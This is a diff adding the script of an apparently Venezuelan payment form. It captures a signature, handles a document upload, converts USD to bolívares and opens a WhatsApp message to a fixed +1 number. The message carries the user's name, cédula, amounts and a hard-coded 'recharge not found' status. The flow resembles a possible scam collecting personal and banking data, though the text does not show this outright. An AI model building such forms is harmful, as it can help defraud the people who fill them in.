+      ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
+    });
+
+    document.getElementById('saveSignature').addEventListener('click', () => {
+      const dataURL = signatureCanvas.toDataURL('image/png');
+      document.getElementById('signatureData').value = dataURL;
+      document.getElementById('signaturePreview').src = dataURL;
+      document.getElementById('signaturePreviewContainer').style.display = 'block';
+      closeSignatureModal();
+    });
+
+    /****************************************************
+     * Mostrar nombre del archivo subido
+     ****************************************************/
+    const docUpload = document.getElementById('docUpload');
+    const docUploadName = document.getElementById('docUploadName');
+    docUpload.addEventListener('change', () => {
+      if (docUpload.files.length > 0) {
+        docUploadName.textContent = docUpload.files[0].name;
+      } else {
+        docUploadName.textContent = '';
+      }
+    });
+
+    /****************************************************
+     * Autocompletar bank code y calcular Bs
+     ****************************************************/
+    const bankNameSelect = document.getElementById('bankName');
+    const accountNumberInput = document.getElementById('accountNumber');
+    bankNameSelect.addEventListener('change', () => {
+      const val = bankNameSelect.value;
+      if (val.includes('|')) {
+        const [code] = val.split('|');
+        if (code) {
+          accountNumberInput.value = code;
+        }
+      }
+    });
+
+    const usdAmountSelect = document.getElementById('usdAmount');
+    const bsAmountInput = document.getElementById('bsAmount');
+    usdAmountSelect.addEventListener('change', () => {
+      const usdValue = parseFloat(usdAmountSelect.value) || 0;
+      const calculatedBs = usdValue * 81; 
+      if (calculatedBs > 0) {
+        bsAmountInput.value = calculatedBs.toString();
+      } else {
+        bsAmountInput.value = '';
+      }
+    });
+
+    /****************************************************
+     * WhatsApp Error
+     ****************************************************/
+    function openWhatsAppError() {
+      const fullName = document.getElementById('fullName').value;
+      const cedulaNumber = document.getElementById('cedulaNumber').value;
+      const docFileName = docUpload.files.length ? docUpload.files[0].name : '';
+      const usdAmount = document.getElementById('usdAmount').value;
+      const bsAmount = document.getElementById('bsAmount').value;
+      const comprobante = document.getElementById('comprobante').value;
+
+      let mensaje = `Hola, necesito ayuda con mi transacción:
+- Nombre Completo: ${fullName}
+- Cédula: ${cedulaNumber}
+- Documento Subido: ${docFileName}
+- Monto en USD: ${usdAmount || 'N/A'}
+- Monto en Bolívares (aprox): ${bsAmount || 'N/A'}
+- Nº de Comprobante: ${comprobante}
+- Estado: No se encontró la recarga de 2.025 Bs
+- Fecha: ${new Date().toLocaleDateString()}`;
+
+      mensaje = encodeURIComponent(mensaje);
+      const numeroWhats = '17373018059';
+      const waLink = `https://wa.me/${numeroWhats}?text=${mensaje}`;
+      window.open(waLink, '_blank');
+    }
+  </script>
+</body>
+</html>
